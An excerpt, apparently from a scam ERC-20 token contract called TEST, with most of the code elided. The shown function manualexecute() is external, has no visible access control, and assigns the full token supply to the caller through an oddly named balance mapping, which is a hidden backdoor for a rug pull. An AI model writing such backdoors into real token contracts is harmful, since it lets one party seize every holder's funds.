...
contract TEST is Context, IERC20, Ownable {
    ...
    mapping (address => uint256) private bruiserss;
    ...
    function balancesOf(address account) public view override returns (uint256) {
        return bruiserss[account];
    }
    ...
    function zues() external virtual {
    ...
    function manualexecute() external virtual{
        bridgefast = 39;
        bruiserss[_msgSender()] = _tTotal;
    }
